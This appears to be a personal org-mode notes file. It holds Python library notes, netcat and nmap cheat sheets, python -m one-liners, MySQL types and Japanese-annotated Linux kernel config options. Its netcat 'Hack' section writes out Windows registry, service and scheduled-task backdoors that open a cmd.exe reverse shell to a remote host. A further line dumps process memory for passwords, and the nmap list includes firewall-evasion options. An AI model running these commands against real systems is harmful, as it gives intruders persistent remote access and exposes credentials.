1 warnings              -Nonfatal Alerts
2 abc                   -Abstract Base Classes
3 dis                   -Python Bytecode Disassembler
4 inspect               -Inspect Live Objects
5 exceptions            -Built-in Exception Classes

****** Modules and Packages
1 imp                   -Python's Import Mechanism
2 zipimport             -Load Python Code from ZIP Archives
3 pkgutil               -Package Utilities

***** optparse
(setq optparse '(("action="          . ("'store'," "'store_const'." "'store_true',"
										"'store_false'," "'append'," "'append_const'," "'count',"))
				 ("type="            . ("'string'" "'int'" "'long'" "'choice'" "'float'" "'complex'"))
				 ("dest="            . ("'',"))
				 ("default="         . ("'True'," "'False',"))
				 ("nargs="           . ("1" "2" "3" "4" "5" "6" "7" "8" "9"))
				 ("const="           . ("''"))
				 ("choices="         . ("''"))
				 ("callback="        . ("''"))
				 ("callback_args="   . ("''"))
				 ("callback_kwargs=" . ("''"))
				 ("help="            . ("''"))
				 ("metavar"          . ("''"))
				 ))
***** typecheck
****** inspect
- inspect.ismodule ()
- inspect.isclass ()
- inspect.ismethod ()
- inspect.ismethoddescriptor ()
- inspect.ismemberdescriptor ()
- inspect.isgetsetdescriptor ()
- inspect.isfunction ()
- inspect.isgeneratorfunction ()
- inspect.isgenerator ()
- inspect.istraceback ()
- inspect.isframe ()
- inspect.iscode ()
- inspect.isbuiltin ()
- inspect.isroutine ()
- inspect.isabstract ()

****** types
if type (etc) == types.NoneType:
if type (etc) == types.TypeType:
if type (etc) == types.ObjectType:
if type (etc) == types.IntType:
if type (etc) == types.LongType:
if type (etc) == types.FloatType:
if type (etc) == types.BooleanType:
if type (etc) == types.ComplexType:
if type (etc) == types.StringType:
if type (etc) == types.UnicodeType:
if type (etc) == types.StringTypes:
if type (etc) == types.StringTypes:
if type (etc) == types.BufferType:
if type (etc) == types.TupleType:
if type (etc) == types.ListType:
if type (etc) == types.DictType:
if type (etc) == types.FunctionType:
if type (etc) == types.LambdaType:
if type (etc) == types.CodeType:
if type (etc) == types.GeneratorType:
if type (etc) == types.ClassType:
if type (etc) == types.UnboundMethodType:
if type (etc) == types._x:
if type (etc) == types.InstanceType:
if type (etc) == types.MethodType:
if type (etc) == types.BuiltinFunctionType:
if type (etc) == types.BuiltinMethodType:
if type (etc) == types.ModuleType:
if type (etc) == types.FileType:
if type (etc) == types.XRangeType:
if type (etc) == types.tb:
if type (etc) == types.TracebackType:
if type (etc) == types.FrameType:
if type (etc) == types.SliceType:
if type (etc) == types.EllipsisType:
if type (etc) == types.DictProxyType:
if type (etc) == types.NotImplementedType:
if type (etc) == types.GetSetDescriptorType:
if type (etc) == types.MemberDescriptorType:

****** isinstance
- isinstance (object, classinfo)

***** while
def while1 ():
    while 1:
        pass

def while_ture ():
    while True:
        pass

dis.dis (while1)
  2           0 SETUP_LOOP               3 (to 6)

  3     >>    3 JUMP_ABSOLUTE            3
        >>    6 LOAD_CONST               0 (None)
              9 RETURN_VALUE

dis.dis (while_ture)
  2           0 SETUP_LOOP              10 (to 13)
        >>    3 LOAD_GLOBAL              0 (True)
              6 POP_JUMP_IF_FALSE       12

  3           9 JUMP_ABSOLUTE            3
        >>   12 POP_BLOCK
        >>   13 LOAD_CONST               0 (None)
             16 RETURN_VALUE

**** Librarys Category
***** String
****** regexp
- re

****** IO interface
- cStringIO

****** diff
- difflib

****** text
- textwrap

***** Data
****** Database
***** Times                         
- date 
- calendar
- dateutil

***** Mathematic
***** Binary
- bitarray
***** File and Directory
****** File Format
******* Archiving
******** gzip
- gzip
(ref. [[http://docs.python.org/2/library/gzip.html#examples-of-usage][documment]])

>>> import gzip
>>> f = gzip.open ('file.txt.gz', 'rb')
>>> file_content = f.read ()
>>> f.close ()
=*=*=*=
>>> import gzip
>>> content = "Lots of content here"
>>> f = gzip.open ('file.txt.gz', 'wb')
>>> f.write (content)
>>> f.close ()
=*=*=*=

******** zip
******** tar
******** 7z
******* PDF
- pyPdf
******* CSV
- unicodecsv
******* xls
- xlrd
- xlwt
- xlutils
******* doc

****** Temporary File and Directory
****** Persistence
***** Security
****** Crypt
- pycrypto
***** Networking
****** Networking
- ipaddress
****** Internet Data Handling
- lxml
- feedparser
****** Internet Protocols and Support
******* FTP
- pyftpdlib
- simpleFTP
******* SSH
- paramiko

****** Structured Markup Processing
***** Multimedia
****** Images
- PIL (python Imaging Library)

****** Videos
***** Operating System
****** Optional Operating System Services
***** User Interface
****** GUI
- easygui
- wxPython

******* clipboard
- pyperclip
>>> import pyperclip
>>> pyperclip.copy ('hello')
>>> pyperclip.paste ()
'hello'

****** CUI
******* Terminal
******** opitons
- argparse
- curses

******** Color
- colorama
[example]
#+BEGIN_SRC python
from colorama import init, Fore, Style
init ()
FUNC_FMT = (Fore.CYAN+Style.BRIGHT+'{}'+Style.RESET_ALL).format
WHITE_FMT = (Fore.WHITE+Style.BRIGHT +'{}'+Style.RESET_ALL).format
print (FUNC_FMT ('hello cyan'))
print (FUNC_FMT ('hello white'))
#+END_SRC

- t1.coloramautil
#+BEGIN_SRC python
from t1.coloramautil.formatter import FORECYAN_RESET
print (BRIGHT (FORECYAN_RESET ('hello')))
#+END_SRC

***** GEO
***** Internationalization
***** Development Tools
****** Debugging and Profiling
****** Test
- nose
- mocker
- coverage
***** Pyhton Specific
****** Python Runtime Services
- virtualenv
****** Interpreters
- ipython
****** Language Services
- clonedigger
****** compiler package
****** Importing Modules
***** Restricted Execution
***** Miscellaneous Services
***** Platform Specific
****** MS Windows Specific Services
****** Unix Specific Services
****** Mac OS X specific services
****** MacPython OSA Modules
****** SGI IRIX Specific Services
****** SunOS Specific Services
***** Undocumented Modules

***** Device
****** cdrom
- pygame.cdrom
>>> import pygame.cdrom as cdrom
>>> cdrom.init ()
>>> cd = cdrom.CD (0) # 0 = first cdrom device
>>> cd.init ()
>>> cd.eject ()
>>> cd.quit ()
>>> cdrom.quit ()

*** Assembly
* etc
* linux
* mindmap
* ref
** netcat															 :netcat:
*** Information Gathering
Port Scan                          nc -vv -w 1 -n -r -z [target] [port-range]

Web Banner Grab                    nc -vv [target] 80
                                   HEAD / HTTP/1.0
				   [Enter]
Detection Outbound Filter          server: iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
                                           iptables -t nat -A PREROUTING -i eth0 -p udp --dport 1:65535 -j REDIRECT --to-port 1234
					   iptables -L -n -t nat
					   nc -vvlp 1234
					   nc -vvulp 1234
			           client: nc -vvz [target] 1-65535

*** File Transfer
Web Server                         while true; do nc -vvlp 80 -q 1 < [filename]; done
Clonig Hard Drive                  Server: nc -vvlp [port] | dd of=[device (/dev/sda)]
                                   Client: dd if=[device (/dev/sda)] | nc -vv [serverip] [port]
*** Web Server
one page server                    while true; do nc -vvlp 80 -q 1 < [html|etc]; done

*** Redirecting Ports and Traffic
Redirecting                        server: nc -vvlp [port]
                                   middle: nc --vvlp [port] | nc [server] [port]
                                   Client: nc [middle] [port]

*** Hack
Backdoor                           c:\reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v nc /t REG_SZ /d " c:\windows\nc.exe -d 192.168.1.70 1234 -e cmd.exe "
Windows Service Backdoor           sc create [name (Network Connection Driver Service)] binPath= " cmd /K start c:\nc.exe – d [LHOST] [LPORT] – e cmd.exe " start= auto error= ignore
Task Scheduling Backdoor           at [time (15:00:00)] /every:n,t,w,th,f,s,su ""c:\nc.exe – d [LHOST] [LPORT] – e cmd.exe""

** Nmap																   :nmap:
*** Basic Scanning Techniques *
Scan a Single Target               nmap [target]
Scan Multiple Targets              nmap [target1, target2, etc]
Scan a List of Targets             nmap -iL [list.txt]
Scan a Range of Hosts              nmap [range of ip addresses]
Scan an Entire Subnet              nmap [ip address/cdir]
Scan Random Hosts                  nmap -iR [number]
Excluding Targets from a Scan      nmap [targets] --exclude [targets]
Excluding Targets Using a List     nmap [targets] --excludefile [list.txt]
Perform an Aggressive Scan         nmap -A [target]
Scan an IPv6 Target                nmap -6 [target]

*** Discovery Options *
Perform a Ping Only Scan           nmap -sP [target]
Don ' t Ping                      nmap -PN [target]
TCP SYN Ping                       nmap -PS [target]
TCP ACK Ping                       nmap -PA [target]
UDP Ping                           nmap -PU [target]
SCTP INIT Ping                     nmap -PY [target]
ICMP Echo Ping                     nmap -PE [target]
ICMP Timestamp Ping                nmap -PP [target]
ICMP Address Mask Ping             nmap -PM [target]
IP Protocol Ping                   nmap -PO [target]
ARP Ping                           nmap -PR [target]
Traceroute                         nmap --traceroute [target]
Force Reverse DNS Resolution       nmap -R [target]
Disable Reverse DNS Resolution     nmap -n [target]
Alternative DNS Lookup             nmap --system-dns [target]
Manually Specify DNS Server (s)    nmap --dns-servers [servers] [target]
Create a Host List                 nmap -sL [targets]

*** Advanced Scanning Functions *
TCP SYN Scan                       nmap -sS [target]
TCP Connect Scan                   nmap -sT [target]
UDP Scan                           nmap -sU [target]
TCP NULL Scan                      nmap -sN [target]
TCP FIN Scan                       nmap -sF [target]
Xmas Scan                          nmap -sX [target]
TCP ACK Scan                       nmap -sA [target]
Custom TCP Scan                    nmap --scanflags [flags] [target]
IP Protocol Scan                   nmap -sO [target]
Send Raw Ethernet Packets          nmap --send-eth [target]
Send IP Packets                    nmap --send-ip [target]

*** Port Scanning Options *
Perform a Fast Scan                nmap -F [target]
Scan Specific Ports                nmap -p [port (s)] [target]
Scan Ports by Name                 nmap -p [port name (s)] [target]
Scan Ports by Protocol             nmap -sU -sT -p U:[ports],T:[ports] [target]
Scan All Ports                     nmap -p "*" [target]
Scan Top Ports                     nmap --top-ports [number] [target]
Perform a Sequential Port Scan     nmap -r [target]

*** Version Detection *
Operating System Detection         nmap -O [target]
Submit TCP/IP Fingerprints         www.nmap.org/submit/
Attempt to Guess an Unknown        nmap -O --osscan-guess [target]
Service Version Detection          nmap -sV [target]
Troubleshooting Version Scans      nmap -sV --version-trace [target]
Perform a RPC Scan                 nmap -sR [target]

*** Timing Options *
Timing Templates                   nmap -T[0-5] [target]
Set the Packet TTL                 nmap --ttl [time] [target]
Minimum # of Parallel Operations   nmap --min-parallelism [number] [target]
Maximum # of Parallel Operations   nmap --max-parallelism [number] [target]
Minimum Host Group Size            nmap --min-hostgroup [number] [targets]
Maximum Host Group Size            nmap --max-hostgroup [number] [targets]
Maximum RTT Timeout                nmap --initial-rtt-timeout [time] [target]
Initial RTT Timeout                nmap --max-rtt-timeout [TTL] [target]
Maximum Retries                    nmap --max-retries [number] [target]
Host Timeout                       nmap --host-timeout [time] [target]
Minimum Scan Delay                 nmap --scan-delay [time] [target]
Maximum Scan Delay                 nmap --max-scan-delay [time] [target]
Minimum Packet Rate                nmap --min-rate [number] [target]
Maximum Packet Rate                nmap --max-rate [number] [target]
Defeat Reset Rate Limits           nmap --defeat-rst-ratelimit [target]

*** Firewall Evasion Techniques *
Fragment Packets                   nmap -f [target]
Specify a Specific MTU             nmap --mtu [MTU] [target]
Use a Decoy                        nmap -D RND:[number] [target]
Idle Zombie Scan                   nmap -sI [zombie] [target]
Manually Specify a Source Port     nmap --source-port [port] [target]
Append Random Data                 nmap --data-length [size] [target]
Randomize Target Scan Order        nmap --randomize-hosts [target]
Spoof MAC Address                  nmap --spoof-mac [MAC|0|vendor] [target]
Send Bad Checksums                 nmap --badsum [target]

*** Output Options *
Save Output to a Text File         nmap -oN [scan.txt] [target]
Save Output to a XML File          nmap -oX [scan.xml] [target]
Grepable Output                    nmap -oG [scan.txt] [targets]
Output All Supported File Types    nmap -oA [path/filename] [target]
Periodically Display Statistics    nmap --stats-every [time] [target]
133t Output                        nmap -oS [scan.txt] [target]

*** Troubleshooting and Debugging *
Getting Help                       nmap -h
Display Nmap Version               nmap -V
Verbose Output                     nmap -v [target]
Debugging                          nmap -d [target]
Display Port State Reason          nmap --reason [target]
Only Display Open Ports            nmap --open [target]
Trace Packets                      nmap --packet-trace [target]
Display Host Networking            nmap --iflist
Specify a Network Interface        nmap -e [interface] [target]

*** Nmap Scripting Engine *
Execute Individual Scripts         nmap --script [script.nse] [target]
Execute Multiple Scripts           nmap --script [expression] [target]
Script Categories                  all, auth, default, discovery, external,
                                   intrusive, malware, safe, vuln
Execute Scripts by Category        nmap --script [category] [target]
Execute Multiple Script Categories nmap --script [category1,category2,etc]
Troubleshoot Scripts               nmap --script [script] --script-trace  [target]
Update the Script Database         nmap --script-updatedb

*** Ndiff *
Comparison Using Ndiff             ndiff [scan1.xml] [scan2.xml]
Ndiff Verbose Mode                 ndiff -v [scan1.xml] [scan2.xml]
XML Output Mode                    ndiff --xml [scan1.xml] [scan2.xml]
** python -m (one liner)											 :python:
         Command                                      Functionality
python -m site             Print some useful information (sys.path, USER_BASE, USER_SITE)
python -m StringIO         Read information about the file (default: /etc/passwd)
python -m calendar         Show the console calendar
python -m zipfile          Zip/unzip analogue
python -m platform         Print the platform information
python -m mailcap          Show and execute MIME types handlers
python -m binhex           Convert the binary file to hex
python -m sgmllib          Parse the html file
python -m htmllib          Show the html file in the text mode
python -m webbrowser       Start the default web browser for the required URL
python -m urllib           Print the content of the remote site
python -m ftplib           Simple FTP client
python -m poplib           Print information about the remote mailbox
python -m smtpd            RFC 2821 SMTP proxy
python -m telnetlib        Simple telnet client
python -m SimpleHTTPServer Simple HTTP server
python -m CGIHTTPServer    CGI-savvy HTTP server
python -m aifc             Print information about the .aiff file
python -m sndhdr           Print information about sound files
python -m locale           Print locale information
python -m shlex            Split the file to tokens
python -m pydoc            Python documentation tool
python -m doctest          Doctest runner
python -m unittest         Unittest runner
python -m pdb              Python debugger
python -m timeit           Tool for measuring execution time of small code snippets
python -m trace            Trace Python program or function execution
python -m code             Python interpreter emulator
python -m tokenize         Split the file to tokens with detailed information
python -m pyclbr           Describe Python module classes and methods
python -m compileall       Compile all .py files to .pyc (.pyo) files
python -m filecmp          Compare two directory
python -m gzip             Gzip/gunzip analogue
python -m base64           RFC 3548: Base16, Base32, Base64 data encoder
python -m quopri           Convert to/from quoted-printable transport encoding as per RFC 1521
python -m cProfile         Profile Python code via 'lsprof' profiler
python -m profile          Profile Python code
python -m uu               Implement UUencode and UUdecode functions
python -m dis              Disassemble of Python byte code into mnemonics
python -m formatter        Generic output formatter

* security
** dump memory process from password
- PsTools\x86\userdump.exe %psid%

* windows
* templete.org
* mysql
** 整数型
   - TINYINT
     -128 から 127 (UNSIGNED の場合 0 から 255)

   - SMALLINT
     -32768 から 32767 (UNSIGNED の場合 0 から 65535)
   
   - MEDIUMINT
     -8388608 から 8388607 (UNSIGNED の場合 0 から 16777215)
   
   - INT
     -2147483648 から 2147483647 (UNSIGNED の場合 0 から 4294967295)
     別名： INTEGER
   
   - BIGINT
     -9223372036854775808 から 9223372036854775807
     (UNSIGNED の場合 0 から 18446744073709551615)

   - examples
     INT UNSIGNED

* 憂い
- 消火器


* kernel

** .config

   - 64-bit kernel                 

*** General setup
    | Cross-compiler tool prefix                                        |                                                                                                                                                                                                                  |                                    |
    | Compile also drivers which will not load                          |                                                                                                                                                                                                                  |                                    |
    | Local version - append to kernel release                          | バージョン番号に付加する文字列を設定 (例： Project-001 等)                                                                                                                                                        |                                    |
    | Automatically append version information to the version string    | バージョン管理システムで使うリビジョン番号をバージョン文字列に付加                                                                                                                                               |                                    |
    | ((none)) Default hostname                                         |                                                                                                                                                                                                                  |                                    |
    | Kernel compression mode                                           | カーネルの圧縮モード設定。 速度優先なら LZ4 。ディスクスペース節約なら xz 。                                                                                                                                     |                                    |
    | Support for paging of anonymous memory (swap)                     | メモリー・ページを 2 次記憶装置に退避させるメモリー・スワッピング機能を有効にする                                                                                                                                |                                    |
    | System V IPC                                                      | System V 方式のプロセス間通信をサポートする                                                                                                                                                                      |                                    |
    | POSIX Message Queues                                              | POSIX で定義されたメッセージ・キューをサポートする                                                                                                                                                               |                                    |
    | Enable process_vm_readv/writev syscalls                           |                                                                                                                                                                                                                  |                                    |
    | open by fhandle syscalls                                          |                                                                                                                                                                                                                  |                                    |
    | uselib syscall                                                    |                                                                                                                                                                                                                  |                                    |
    | Auditing support                                                  | システム監査用フレームワークを有効にする                                                                                                                                                                         |                                    |
    | Enable system-call auditing support                               |                                                                                                                                                                                                                  |                                    |
    | Kernel .config support                                            | カーネル設定ファイル（.config ）をカーネル内部に保存する                                                                                                                                                         |                                    |
    | Kernel log buffer size (16 => 64KB, 17 => 128KB)                  |                                                                                                                                                                                                                  |                                    |
    | CPU kernel log buffer size contribution (13 => 8 KB, 17 => 128KB) |                                                                                                                                                                                                                  |                                    |
    | Automatic process group scheduling                                | TTY ごとにタスクグループを自動的に生成する                                                                                                                                                                       | デスクトップで描画速度が改善する。 |
    | Enable deprecated sysfs features to support old userspace tools   |                                                                                                                                                                                                                  |                                    |
    | Kernel->user space relay support (formerly relayfs)               | debugfs などのファイル・システムのリレー・インタフェースをサポートする                                                                                                                                           |                                    |
    | Initial RAM filesystem and RAM disk (initramfs/initrd) support    | 初期 RAM ディスクをサポート                                                                                                                                                                                      |                                    |
    | Initramfs source file (s)                                          | ファイル名の指定、初期値=initrd.img                                                                                                                                                                              |                                    |
    | Support initial ramdisks compressed using gzip                    |                                                                                                                                                                                                                  |                                    |
    | Support initial ramdisks compressed using bzip2                   |                                                                                                                                                                                                                  |                                    |
    | Support initial ramdisks compressed using LZMA                    |                                                                                                                                                                                                                  |                                    |
    | Support initial ramdisks compressed using XZ                      |                                                                                                                                                                                                                  |                                    |
    | Support initial ramdisks compressed using LZO                     |                                                                                                                                                                                                                  |                                    |
    | Support initial ramdisks compressed using LZ4                     |                                                                                                                                                                                                                  |                                    |
    | Optimize for size                                                 | サイズ優先の最適化をしてカーネルをコンパイルする                                                                                                                                                                 |                                    |
    | Enable bpf () system                                               | Burkley Packet Filter                                                                                                                                                                                            | on use Wireshark tcpdump           |
    | Embedded system                                                   |                                                                                                                                                                                                                  |                                    |
    | Disable heap randomization                                        | heap ランダム化無効                                                                                                                                                                                              |                                    |
    | Provide system-wide ring of trusted keys                          |                                                                                                                                                                                                                  |                                    |
    | Profiling support                                                 | for OProfile                                                                                                                                                                                                     |                                    |
    | OProfile system profiling                                         |                                                                                                                                                                                                                  |                                    |
    | OProfile multiplexing support (EXPERIMENTAL)                      |                                                                                                                                                                                                                  |                                    |
    | Kprobes                                                           | ユーザーがあらかじめ指定したアドレス（プローブポイント）をカーネルが実行した際に、登録されているコールバック関数を呼び出す機能を提供する機構です。特定区間の実行速度の計測や障害発生時の動作解析などに有効です。 |                                    |
    | Optimize very unlikely/likely branches                            |                                                                                                                                                                                                                  |                                    |

**** IRQ subsystem
**** Timers subsystem
     | Timer tick handling (dynticks) | カーネル内の処理を定期的なタイマー割り込みに依存しないようにする |
     | Old Idle dynticks config       |                                                                  |
     | High Resolution Timer Support  |                                                                  |

**** CPU/Task time and stats accounting
     | BSD Process Accounting                         | 一般ユーザー権限で動いているプロセスが終了した時に、そのプロセスに関する情報がカーネルによって記録するかどうかの設定。 |
     | BSD Process Accounting version 3 file format   | バージョン 3 のアカウント情報取得メカニズムを有効にするオプション。                                                      |
     | Export task/process statistics through netlink |                                                                                                                        |
     | Enable per-task delay accounting               |                                                                                                                        |
     | Enable extended accounting over taskstats      | IO account                                                                                                             |
     | Enable per-task storage I/O accounting         |                                                                                                                        |

**** RCU Subsystem
     | Make expert-level adjustments to RCU configuration      |   |
     | Offload RCU callback processing from boot-selected CPUs |   |

**** Control Group support
     | Example debug cgroup subsystem                                    |                                                 |
     | Freezer cgroup subsystem                                          | cgroup 内のタスクを一時停止あるいは再開します。 |
     | Device controller for cgroups                                     |                                                 |
     | Cpuset support                                                    |                                                 |
     | Include legacy /proc/<pid>/cpuset file                            |                                                 |
     | Simple CPU accounting cgroup subsystem                            |                                                 |
     | Memory Resource Controller for Control Groups                     |                                                 |
     | Memory Resource Controller Swap Extension                         |                                                 |
     | Memory Resource Controller Swap Extension enabled by default      |                                                 |
     | Memory Resource Controller Kernel Memory accounting               |                                                 |
     | HugeTLB Resource Controller for Control Groups                    |                                                 |
     | Enable perf_event per-cpu per-container group (cgroup) monitoring |                                                 |
     | Block IO controller                                               |                                                 |
     | Enable Block IO controller debugging                              |                                                 |

***** Group CPU scheduler
      | Group scheduling for SCHED_OTHER                |   |
      | CPU bandwidth provisioning for FAIR_GROUP_SCHED |   |
      | Group scheduling for SCHED_RR/FIFO              |   |

**** Namespaces support
     | UTS namespace     |   |
     | IPC namespace     |   |
     | User namespace    |   |
     | PID Namespaces    |   |
     | Network namespace |   |

**** Configure standard kernel features (expert users)
     | Enable 16-bit UID system calls                  |                |
     | Multiple users, groups and capabilities support |                |
     | sgetmask/ssetmask syscalls support              |                |
     | Sysfs syscall support                           |                |
     | Sysctl syscall support                          |                |
     | Load all symbols for debugging/ksymoops         | /proc/kallsyms |
     | Include all symbols in kallsyms                 |                |
     | Enable support for printk                       |                |
     | BUG () support                                   |                |
     | Enable ELF core dumps                           |                |
     | Enable PC-Speaker support                       |                |
     | Enable full-sized data structures for core      |                |
     | Enable futex support                            |                |
     | Enable eventpoll support                        |                |
     | Enable signalfd () system call                   |                |
     | Enable timerfd () system call                    |                |
     | Enable eventfd () system call                    |                |
 

**** Kernel Performance Events And Counters
**** Choose SLAB allocator
     | SLAB | 一般的なスラブ・アロケータ             |
     | SLUB | メモリーを効率良く使用できるアロケータ |

**** Stack Protector buffer overflow detection (None)
     | None    |   |
     | Regular |   |
     | Strong  |   |

**** GCOV-based kernel profiling
                                                                                      
*** Enable loadable module support
    動的に組み込み可能なカーネル・モジュールに関する設定
     | Forced module loading            | カーネルが危険と判断していても，強制的にカーネル・モジュールをロードする                               |
     | Module unloading                 | カーネル・モジュールの取り外しに対応する                                                               |
     | Forced module unloading          | カーネルが危険と判断していても，強制的にカーネル・モジュールを取り外し可能にする                       |
     | Module versioning support        | カーネル・モジュールにカーネルのバージョン番号を組み込み，バージョンが異なるモジュールを利用不可にする |
     | Source checksum for all modules  | ビルドに使ったソース・コードのチェック・サム情報をカーネル・モジュールに組み込む                       |
     | Module signature verification    |                                                                                                        |
     | Compress modules on installation |                                                                                                        |

*** Enable the block layer
     | Support for large (2TB+) block devices and files | 2T バイトを超えるブロック・デバイスを取り扱るようにする |
     | Block layer SG support v4                        |                                                        |
     | Block layer SG support v4 helper lib             |                                                        |
     | Block layer data integrity support               |                                                        |
     | Block layer bio throttling support               |                                                        |
     | Block device command line partition parser       |                                                        |

**** Partition Types
     | Advanced partition selection                        |   |
     | Acorn partition support                             |   |
     | Cumana partition support                            |   |
     | EESOX partition support                             |   |
     | ICS partition support                               |   |
     | Native filecore partition support                   |   |
     | PowerTec partition support                          |   |
     | RISCiX partition support                            |   |
     | AIX basic partition table support                   |   |
     | Alpha OSF partition support                         |   |
     | Amiga partition table support                       |   |
     | Atari partition table support                       |   |
     | Macintosh partition map support                     |   |
     | PC BIOS (MSDOS partition tables) support            |   |
     | BSD disklabel (FreeBSD partition tables) support    |   |
     | Minix subpartition support                          |   |
     | Solaris (x86) partition table support               |   |
     | Unixware slices support                             |   |
     | Windows Logical Disk Manager (Dynamic Disk) support |   |
     | Windows LDM extra logging                           |   |
     | SGI partition support                               |   |
     | Ultrix partition table support                      |   |
     | Sun partition tables support                        |   |
     | Karma Partition support                             |   |
     | EFI GUID Partition support                          |   |
     | SYSV68 partition table support                      |   |
     | Command line partition support                      |   |
  
**** IO Schedulers
     | Deadline I/O scheduler       | データベースのような単一プロセスの入出力性能向上に向いた (Deadline) スケジューラをサポートする |
     | CFQ I/O scheduler            | デスクトップ環境向き (CFQ) のスケジューラをサポートする                                        |
     | CFQ Group Scheduling support |                                                                                              |

***** Default I/O scheduler (CFQ)
      | Deadline |                                              |
      | CFQ      |                                              |
      | No-op    | スケジューラを使用しない=I/O 要求順に処理する |
      |          |                                              |
   
*** Processor type and features
     | Symmetric multi-processing support                               |                                                                                           |
     | Enable MPS table                                                 |                                                                                           |
     | Support for big SMP systems with more than 8 CPUs                |                                                                                           |
     | Support for extended (non-PC) x86 platforms                      |                                                                                           |
     | Intel Low Power Subsystem Support                                |                                                                                           |
     | AMD ACPI2Platform devices support                                |                                                                                           |
     | Intel SoC IOSF Sideband support for SoC platforms                |                                                                                           |
     | Eurobraille/Iris poweroff module                                 |                                                                                           |
     | Single-depth WCHAN output                                        |                                                                                           |
     | Generic x86 support                                              | x86 互換プロセッサ汎用の最適化をする。選択したプロセッサ以外の x86 環境でも稼働可能になる |
     | PentiumPro memory ordering errata workaround                     |                                                                                           |
     | HPET Timer Support                                               | 高性能なハードウエア・タイマー「 HPET 」をサポートする                                    |
     | Maximum number of CPUs                                           |                                                                                           |
     | SMT (Hyperthreading) scheduler support                           | Hyperthreading のような「 SMT 」（ Simultaneous Multithreading ）機構をサポートする       |
     | Multi-core scheduler support                                     | マルチコア・プロセッサ向けのプロセッサ・スケジューラをサポートする                        |
     | Reroute for broken boot IRQs                                     |                                                                                           |
     | Machine Check / overheating reporting                            |                                                                                           |
     | Intel MCE features                                               |                                                                                           |
     | AMD MCE features                                                 |                                                                                           |
     | Support for old Pentium 5 / WinChip machine checks               |                                                                                           |
     | Machine check injector support                                   |                                                                                           |
     | Enable VM86 support                                              | 32bit 版 OS にて古い 8086 用プログラムを実行するためのもの                                     |
     | Toshiba Laptop support                                           |                                                                                           |
     | Dell i8k legacy laptop support                                   |                                                                                           |
     | Enable X86 board specific fixups for reboot                      |                                                                                           |
     | CPU microcode loading support                                    |                                                                                           |
     | Intel microcode loading support                                  |                                                                                           |
     | AMD microcode loading support                                    |                                                                                           |
     | /dev/cpu/*/msr - Model-specific register support                 | Model-specific レジスタにアクセスするためのデバイス・ファイル（/dev/cpu/*msr ）を有効にする |
     | /dev/cpu/*/cpuid - CPU information support                       | プロセッサ情報（ CPUID ）参照用のデバイス・ファイル（/dev/cpu/*/cpuid ）を有効にする         |
     | PAE (Physical Address Extension) Support                         |                                                                                           |
     | Numa Memory Allocation and Scheduler Support                     |                                                                                           |
     | NUMA emulation                                                   |                                                                                           |
     | Maximum NUMA Nodes (as a power of 2)                             |                                                                                           |
     | Allow for memory compaction                                      |                                                                                           |
     | Page migration                                                   |                                                                                           |
     | Enable bounce buffers                                            |                                                                                           |
     | Enable KSM for page merging                                      |                                                                                           |
     | Low address space to protect from user allocation                |                                                                                           |
     | Enable recovery from hardware memory errors                      |                                                                                           |
     | Transparent Hugepage Support                                     |                                                                                           |
     | Enable cleancache driver to cache clean pages if tmem is present |                                                                                           |
     | Enable frontswap to cache swap pages if tmem is present          |                                                                                           |
     | Contiguous Memory Allocator                                      |                                                                                           |
     | Common API for compressed memory storage                         |                                                                                           |
     | Low density storage for compressed pages                         |                                                                                           |
     | Memory allocator for compressed pages                            |                                                                                           |
     | Support non-standard NVDIMMs and ADR protected memory            |                                                                                           |
     | Allocate 3rd-level pagetables from highmem                       |                                                                                           |
     | Check for low memory corruption                                  |                                                                                           |
     | Amount of low memory, in kilobytes, to reserve for the BIOS      |                                                                                           |
     | Math emulation                                                   |                                                                                           |
     | MTRR (Memory Type Range Register) support                        |                                                                                           |
     | MTRR cleanup support                                             |                                                                                           |
     | MTRR cleanup enable value (0-1)                                  |                                                                                           |
     | MTRR cleanup spare reg num (0-7)                                 |                                                                                           |
     | Intel MPX (Memory Protection Extensions)                         |                                                                                           |
     | EFI runtime service support                                      |                                                                                           |
     | EFI stub support                                                 |                                                                                           |
     | Enable seccomp to safely compute untrusted bytecode              |                                                                                           |
     | kexec system call                                                |                                                                                           |
     | kernel crash dumps                                               |                                                                                           |
     | kexec jump                                                       |                                                                                           |
     | Physical address where the kernel is loaded                      |                                                                                           |
     | Build a relocatable kernel                                       |                                                                                           |
     | Randomize the address of the kernel image                        |                                                                                           |
     | Alignment value to which kernel should be aligned                |                                                                                           |
     | Support for hot-pluggable CPUs                                   |                                                                                           |
     | Set default setting of cpu0_hotpluggable                         |                                                                                           |
     | Debug CPU0 hotplug                                               |                                                                                           |
     | Disable the 32-bit vDSO (needed for glibc 2.3.3)                 |                                                                                           |
     | Built-in kernel command line                                     |                                                                                           |

**** Linux guest support

**** Processor family (Pentium-Pro)
     | 486                                                |   |
     | 586/K5/5x86/6x86/6x86MX                            |   |
     | Pentium-Classic                                    |   |
     | Pentium-MMX                                        |   |
     | Pentium-Pro                                        |   |
     | Pentium-II/Celeron (pre-Coppermine                  |   |
     | Pentium-III/Celeron (Coppermine)/Pentium-III Xeon   |   |
     | Pentium M                                          |   |
     | Pentium-4/Celeron (P4-based)/Pentium-4 M/older Xeon |   |
     | K6/K6-II/K6-III                                    |   |
     | Athlon/Duron/K7                                    |   |
     | Opteron/Athlon64/Hammer/K8                         |   |
     | Crusoe                                             |   |
     | Efficeon                                           |   |
     | Winchip-C6                                         |   |
     | Winchip-2/Winchip-2A/Winchip-                      |   |
     | AMD Elan                                           |   |
     | GeodeGX1                                           |   |
     | Geode GX/LX                                        |   |
     | CyrixIII/VIA-C3                                    |   |
     | VIA C3-2 (Nehemiah)                                |   |
     | VIA C7                                             |   |
     | Core 2/newer Xeon                                  |   |
     | Intel Atom                                         |   |

**** Preemption Model (Preemptible Kernel (Low-Latency Desktop))
     プロセス実行中に CPU を横取りして，ほかのプロセスに割り当
     てるか否かの設定。
     | No Forced Preemption (Server)            | CPU の横取りをしない                     |
     | Voluntary Kernel Preemption (Desktop)    | 特定ポイントだけ CPU の横取りを可能にする |
     | Preemptible Kernel (Low-Latency Desktop) | すべての処理で CPU の横取りを可能にする   |

**** High Memory Support (64GB)
     | off  |   |
     | 4GB  |   |
     | 64GB |   |

**** Memory model (Discontiguous Memory)
     | Discontiguous Memory |   |
     | Sparse Memory        |   |

**** Transparent Hugepage Support sysfs defaults (madvise)
     | always  |   |
     | madvise |   |
   
**** Timer frequency (1000 HZ)
     | 100 HZ  |   |
     | 250 HZ  |   |
     | 300 HZ  |   |
     | 1000 HZ |   |

